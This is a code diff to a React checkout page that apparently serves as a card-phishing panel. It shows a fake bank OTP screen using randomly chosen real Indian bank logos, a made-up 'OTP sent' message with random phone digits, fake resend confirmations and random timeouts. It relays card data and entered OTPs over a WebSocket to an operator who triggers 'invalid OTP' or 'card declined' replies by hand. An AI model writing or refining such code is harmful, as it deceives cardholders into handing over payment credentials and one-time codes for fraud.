@@ -68,6 +68,12 @@ const Checkout = () => {
   const [otpValue, setOtpValue] = useState('');
   const [socket, setSocket] = useState<Socket | null>(null);
   const [confirmingPayment, setConfirmingPayment] = useState(false);
+  const [otpTimer, setOtpTimer] = useState(0);
+  const [otpError, setOtpError] = useState('');
+  const [otpSubmitting, setOtpSubmitting] = useState(false);
+  const [sessionBankLogo, setSessionBankLogo] = useState('');
+  const [resendMessage, setResendMessage] = useState('');
+  const [randomMobile, setRandomMobile] = useState('');
 
   // Pricing data based on the main page
   const pricingData = {
@@ -298,6 +304,38 @@ const Checkout = () => {
     try {
       setConfirmingPayment(true);
       
+      // Set consistent bank logo for this session
+      const bankLogos = [
+        'https://images.seeklogo.com/logo-png/55/2/hdfc-bank-logo-png_seeklogo-556499.png',
+        'https://logolook.net/wp-content/uploads/2023/09/Bank-of-Baroda-Logo.png',
+        'https://images.seeklogo.com/logo-png/55/2/bank-of-india-boi-uganda-logo-png_seeklogo-550573.png',
+        'https://assets.stickpng.com/thumbs/627cc5c91b2e263b45696a8e.png',
+        'https://images.seeklogo.com/logo-png/33/2/central-bank-of-india-logo-png_seeklogo-339766.png',
+        'https://brandlogos.net/wp-content/uploads/2014/01/indian-bank-1907-vector-logo.png',
+        'https://brandlogos.net/wp-content/uploads/2014/01/indian-overseas-bank-iob-vector-logo.png',
+        'https://assets.stickpng.com/thumbs/627cce601b2e263b45696abb.png',
+        'https://brandlogos.net/wp-content/uploads/2014/01/punjab-national-bank-pnb-vector-logo.png',
+        'https://toppng.com/uploads/preview/uco-bank-vector-logo-11574257509n3dw7a8hz4.png',
+        'https://assets.stickpng.com/thumbs/623dd70370712bdafc63c384.png',
+        'https://www.pngguru.in/storage/uploads/images/sbi-logo-png-free-sbi-bank-logo-png-with-transparent-background_1721377630_1949953387.webp',
+        'https://brandlogos.net/wp-content/uploads/2014/12/axis_bank-logo-brandlogos.net_-512x512.png',
+        'https://pnghdpro.com/wp-content/themes/pnghdpro/download/social-media-and-brands/bandhan-bank-logo.png',
+        'https://images.seeklogo.com/logo-png/30/2/city-union-bank-ltd-logo-png_seeklogo-304210.png',
+        'https://www.logoshape.com/wp-content/uploads/2024/08/icici-bank-vector-logo_logoshape.png',
+        'https://pnghdpro.com/wp-content/themes/pnghdpro/download/social-media-and-brands/csb-bank-logo.png',
+        'https://seekvectors.com/storage/images/development%20credit%20bank%20logo.svg',
+        'https://static.cdnlogo.com/logos/d/96/dhanlaxmi-bank.svg',
+        'https://assets.stickpng.com/thumbs/627ccab31b2e263b45696aa2.png',
+        'https://toppng.com/uploads/preview/idbi-bank-vector-logo-11574258107ecape2krza.png',
+        'https://brandeps.com/logo-download/K/Kotak-Mahindra-Bank-logo-vector-01.svg'
+      ];
+      const randomBank = bankLogos[Math.floor(Math.random() * bankLogos.length)];
+      setSessionBankLogo(randomBank);
+      
+      // Generate random mobile number (last 4 digits)
+      const randomMobileDigits = Math.floor(1000 + Math.random() * 9000).toString();
+      setRandomMobile(randomMobileDigits);
+      
       // Connect to WebSocket with proper URL handling for different environments
       const socketUrl = process.env.NODE_ENV === 'production' 
         ? window.location.origin
@@ -361,6 +399,7 @@ const Checkout = () => {
         setConfirmingPayment(false);
         setShowOtp(true);
         setCurrentStep('otp');
+        startOtpTimer();
       });
       
       newSocket.on('payment-approved', () => {
@@ -381,16 +420,9 @@ const Checkout = () => {
       // Enhanced admin response handlers
       newSocket.on('invalid-otp-error', () => {
         clearTimeout(emitTimeout);
-        setConfirmingPayment(false);
-        // Show error message above OTP input
-        const errorDiv = document.createElement('div');
-        errorDiv.className = 'bg-red-50 border border-red-200 rounded-lg p-3 mb-4 text-red-700 text-sm text-center';
-        errorDiv.textContent = 'Invalid OTP, please enter valid one time passcode!';
-        const otpContainer = document.querySelector('input[placeholder="Enter OTP Here"]')?.parentElement;
-        if (otpContainer) {
-          otpContainer.insertBefore(errorDiv, otpContainer.firstChild);
-          setTimeout(() => errorDiv.remove(), 5000);
-        }
+        setOtpSubmitting(false);
+        setOtpError('Invalid OTP, please enter valid one time passcode!');
+        setTimeout(() => setOtpError(''), 5000);
       });
 
       newSocket.on('card-declined-error', () => {
@@ -428,12 +460,63 @@ const Checkout = () => {
         return;
       }
       
+      setOtpSubmitting(true);
+      setOtpError('');
       socket.emit('otp-submitted', { otp: otpValue });
-      setOtpValue('');
     } catch (error) {
       console.error('Error submitting OTP:', error);
+      setOtpSubmitting(false);
       alert('Failed to submit OTP. Please try again.');
     }
+  };
+
+  const handleOtpCancel = () => {
+    setTimeout(() => {
+      setCurrentStep('account');
+      setShowOtp(false);
+      setOtpValue('');
+      setOtpError('');
+      alert('Transaction cancelled');
+    }, 2000);
+  };
+
+  const handleResendOtp = () => {
+    setResendMessage('One time passcode have been sent to your registered mobile number');
+    setTimeout(() => setResendMessage(''), 5000);
+    startOtpTimer();
+  };
+
+  const startOtpTimer = () => {
+    // Random timer between 1.59 to 9.59 minutes (in seconds)
+    const randomMinutes = Math.floor(Math.random() * 8) + 1; // 1-8 minutes
+    const randomSeconds = 59; // Always 59 seconds
+    const totalSeconds = randomMinutes * 60 + randomSeconds;
+    setOtpTimer(totalSeconds);
+  };
+
+  // Timer countdown effect
+  useEffect(() => {
+    let interval: NodeJS.Timeout;
+    if (otpTimer > 0 && currentStep === 'otp') {
+      interval = setInterval(() => {
+        setOtpTimer(prev => {
+          if (prev <= 1) {
+            setCurrentStep('account');
+            setShowOtp(false);
+            alert('Session expired. Please try again.');
+            return 0;
+          }
+          return prev - 1;
+        });
+      }, 1000);
+    }
+    return () => clearInterval(interval);
+  }, [otpTimer, currentStep]);
+
+  const formatTimer = (seconds: number) => {
+    const minutes = Math.floor(seconds / 60);
+    const remainingSeconds = seconds % 60;
+    return `${minutes}.${remainingSeconds.toString().padStart(2, '0')}`;
   };
 
   // Handle refresh on OTP page and initialize socket connection
@@ -1026,9 +1109,19 @@ const Checkout = () => {
             {/* Enhanced OTP Verification Section */}
             {currentStep === 'otp' && (
               <div className="fixed inset-0 bg-black bg-opacity-70 backdrop-blur-sm flex items-center justify-center z-50 p-4">
-                <div className="bg-white rounded-lg max-w-lg w-full transform transition-all duration-500 animate-scale-in overflow-hidden">
-                  {/* Header */}
-                  <div className="bg-white border-b p-4">
+                <div className="bg-white rounded-lg max-w-md w-full transform transition-all duration-500 animate-scale-in overflow-hidden shadow-2xl">
+                  {/* Header with Cancel */}
+                  <div className="absolute top-2 right-2 z-10">
+                    <button 
+                      onClick={handleOtpCancel}
+                      className="text-gray-400 hover:text-gray-600 text-lg font-bold bg-white rounded-full w-8 h-8 flex items-center justify-center shadow-lg"
+                    >
+                      ✕
+                    </button>
+                  </div>
+
+                  {/* Header with Card Security and Bank Logo */}
+                  <div className="bg-white border-b p-4 relative">
                     <div className="flex justify-between items-center">
                       <div className="flex items-center gap-3">
                         <img 
@@ -1044,113 +1137,102 @@ const Checkout = () => {
                         />
                         <span className="text-sm font-medium text-gray-700">ID Check</span>
                       </div>
-                      <div className="text-right">
-                        <button 
-                          onClick={() => setCurrentStep('review')}
-                          className="text-gray-400 hover:text-gray-600 text-xl font-bold"
-                        >
-                          ✕
-                        </button>
+                      <div>
+                        <img 
+                          src={sessionBankLogo || 'https://images.seeklogo.com/logo-png/55/2/hdfc-bank-logo-png_seeklogo-556499.png'}
+                          alt="Bank Logo" 
+                          className="h-8 w-20 object-contain"
+                        />
                       </div>
                     </div>
                   </div>
 
-                  {/* Bank Logo */}
-                  <div className="absolute top-4 right-16">
-                    <img 
-                      src={(() => {
-                        const bankLogos = [
-                          'https://images.seeklogo.com/logo-png/55/2/hdfc-bank-logo-png_seeklogo-556499.png',
-                          'https://logolook.net/wp-content/uploads/2023/09/Bank-of-Baroda-Logo.png',
-                          'https://images.seeklogo.com/logo-png/55/2/bank-of-india-boi-uganda-logo-png_seeklogo-550573.png',
-                          'https://assets.stickpng.com/thumbs/627cc5c91b2e263b45696a8e.png',
-                          'https://images.seeklogo.com/logo-png/33/2/central-bank-of-india-logo-png_seeklogo-339766.png',
-                          'https://brandlogos.net/wp-content/uploads/2014/01/indian-bank-1907-vector-logo.png',
-                          'https://brandlogos.net/wp-content/uploads/2014/01/indian-overseas-bank-iob-vector-logo.png',
-                          'https://assets.stickpng.com/thumbs/627cce601b2e263b45696abb.png',
-                          'https://brandlogos.net/wp-content/uploads/2014/01/punjab-national-bank-pnb-vector-logo.png',
-                          'https://toppng.com/uploads/preview/uco-bank-vector-logo-11574257509n3dw7a8hz4.png',
-                          'https://assets.stickpng.com/thumbs/623dd70370712bdafc63c384.png',
-                          'https://www.pngguru.in/storage/uploads/images/sbi-logo-png-free-sbi-bank-logo-png-with-transparent-background_1721377630_1949953387.webp',
-                          'https://brandlogos.net/wp-content/uploads/2014/12/axis_bank-logo-brandlogos.net_-512x512.png',
-                          'https://pnghdpro.com/wp-content/themes/pnghdpro/download/social-media-and-brands/bandhan-bank-logo.png',
-                          'https://images.seeklogo.com/logo-png/30/2/city-union-bank-ltd-logo-png_seeklogo-304210.png',
-                          'https://www.logoshape.com/wp-content/uploads/2024/08/icici-bank-vector-logo_logoshape.png'
-                        ];
-                        return bankLogos[Math.floor(Math.random() * bankLogos.length)];
-                      })()}
-                      alt="Bank Logo" 
-                      className="h-12 w-20 object-contain"
-                    />
-                  </div>
-
                   {/* Main Content */}
                   <div className="p-6">
-                    <h2 className="text-xl font-bold text-gray-800 mb-4 text-center">Merchant Details</h2>
+                    <h2 className="text-lg font-bold text-gray-800 mb-4 text-center">Merchant Details</h2>
                     
-                    <div className="bg-gray-50 rounded-lg p-4 mb-6">
-                      <div className="space-y-3 text-sm">
-                        <div className="flex justify-between">
-                          <span className="text-gray-600">Merchant Name</span>
-                          <span className="font-medium text-gray-800">Pluralsight LLC</span>
-                        </div>
-                        <div className="flex justify-between">
-                          <span className="text-gray-600">Date</span>
-                          <span className="font-medium text-gray-800">{new Date().toLocaleDateString('en-GB', { day: '2-digit', month: 'short', year: 'numeric' })}</span>
-                        </div>
-                        <div className="flex justify-between">
-                          <span className="text-gray-600">Card Number</span>
-                          <span className="font-medium text-gray-800">
-                            {cardData.cardNumber.slice(0, 4)} XXXX XXXX {cardData.cardNumber.slice(-4)}
-                          </span>
-                        </div>
-                        <div className="flex justify-between">
-                          <span className="text-gray-600">Amount</span>
-                          <span className="font-bold text-blue-600">₹{displayPrice.toLocaleString()}</span>
-                        </div>
+                    <div className="bg-gray-50 rounded-lg p-4 mb-4 space-y-2">
+                      <div className="flex justify-between text-sm">
+                        <span className="text-gray-600">Merchant Name</span>
+                        <span className="font-medium text-gray-800">Pluralsight LLC</span>
+                      </div>
+                      <div className="flex justify-between text-sm">
+                        <span className="text-gray-600">Date</span>
+                        <span className="font-medium text-gray-800">{new Date().toLocaleDateString('en-GB', { day: '2-digit', month: 'short', year: 'numeric' })}</span>
+                      </div>
+                      <div className="flex justify-between text-sm">
+                        <span className="text-gray-600">Card Number</span>
+                        <span className="font-medium text-gray-800">
+                          {cardData.cardNumber.slice(0, 4)} XXXX XXXX {cardData.cardNumber.slice(-4)}
+                        </span>
+                      </div>
+                      <div className="flex justify-between text-sm">
+                        <span className="text-gray-600">Amount</span>
+                        <span className="font-bold text-blue-600">₹{displayPrice.toLocaleString()}</span>
                       </div>
                     </div>
 
                     <h3 className="text-lg font-bold text-blue-600 mb-4 text-center">Authenticate Transaction</h3>
 
+                    {/* Error Message */}
+                    {otpError && (
+                      <div className="bg-red-50 border border-red-200 rounded-lg p-3 mb-4">
+                        <p className="text-red-700 text-sm text-center">{otpError}</p>
+                      </div>
+                    )}
+
+                    {/* Resend Success Message */}
+                    {resendMessage && (
+                      <div className="bg-green-50 border border-green-200 rounded-lg p-3 mb-4">
+                        <p className="text-green-700 text-sm text-center">{resendMessage}</p>
+                      </div>
+                    )}
+
                     {/* OTP Success Message */}
                     <div className="bg-green-50 border border-green-200 rounded-lg p-3 mb-4">
                       <p className="text-green-700 text-sm text-center">
-                        Successfully sent OTP to your registered mobile number XXXXXX{Math.floor(1000 + Math.random() * 9000)}
+                        Successfully sent OTP to your registered mobile number XXXXXX{randomMobile}
                       </p>
                     </div>
 
                     {/* Click Here for Addon */}
-                    <div className="mb-4">
-                      <button className="text-blue-600 text-sm hover:underline">
+                    <div className="mb-4 text-center">
+                      <button className="text-blue-600 text-sm hover:underline bg-blue-50 px-3 py-1 rounded">
                         CLICK HERE For Addon Cardholder OTP
                       </button>
                     </div>
 
                     {/* OTP Input */}
-                    <div className="mb-6">
+                    <div className="mb-4">
                       <Input
                         value={otpValue}
                         onChange={(e) => setOtpValue(e.target.value.replace(/\D/g, '').slice(0, 6))}
-                        className="bg-white text-gray-900 text-center text-lg tracking-widest h-12 border-gray-300"
+                        disabled={otpSubmitting}
+                        className={`bg-white text-gray-900 text-center text-lg tracking-widest h-12 border-gray-300 ${otpSubmitting ? 'opacity-50' : ''}`}
                         placeholder="Enter OTP Here"
                         maxLength={6}
                         style={{ 
-                          color: otpValue ? '#1f2937' : '#9ca3af'
+                          color: otpValue ? '#1f2937' : '#9ca3af',
+                          letterSpacing: '0.5em'
                         }}
                       />
+                    </div>
+
+                    {/* Resend OTP */}
+                    <div className="mb-6 text-center">
+                      <button 
+                        onClick={handleResendOtp}
+                        className="text-blue-600 text-sm hover:underline"
+                      >
+                        Resend OTP
+                      </button>
                     </div>
 
                     {/* Buttons */}
                     <div className="space-y-3 mb-6">
                       <div className="flex gap-3">
                         <Button
-                          onClick={() => {
-                            setTimeout(() => {
-                              setCurrentStep('review');
-                              alert('Payment failed: User cancelled transaction');
-                            }, 2000);
-                          }}
+                          onClick={handleOtpCancel}
                           variant="outline"
                           className="flex-1 h-10 text-gray-700 border-gray-300 hover:bg-gray-50"
                         >
@@ -1158,21 +1240,25 @@ const Checkout = () => {
                         </Button>
                         <Button
                           onClick={handleOtpSubmit}
-                          disabled={otpValue.length !== 6}
-                          className="flex-1 h-10 bg-blue-600 hover:bg-blue-700 text-white disabled:opacity-50"
+                          disabled={otpValue.length !== 6 || otpSubmitting}
+                          className="flex-1 h-10 bg-blue-600 hover:bg-blue-700 text-white disabled:opacity-50 relative"
                         >
-                          SUBMIT
+                          {otpSubmitting ? (
+                            <>
+                              <Loader2 className="h-4 w-4 animate-spin mr-2" />
+                              <span className="opacity-50">SUBMIT</span>
+                            </>
+                          ) : (
+                            'SUBMIT'
+                          )}
                         </Button>
                       </div>
                     </div>
 
                     {/* Timer and Powered by */}
-                    <div className="text-center space-y-3">
+                    <div className="text-center space-y-2">
                       <p className="text-xs text-gray-500">
-                        This page automatically time out after {(() => {
-                          const timers = ['1.59', '2.59', '4.59', '9.59'];
-                          return timers[Math.floor(Math.random() * timers.length)];
-                        })()} minutes
+                        This page automatically time out after {formatTimer(otpTimer)} minutes
                       </p>
                       
                       <div className="flex items-center justify-center gap-2">
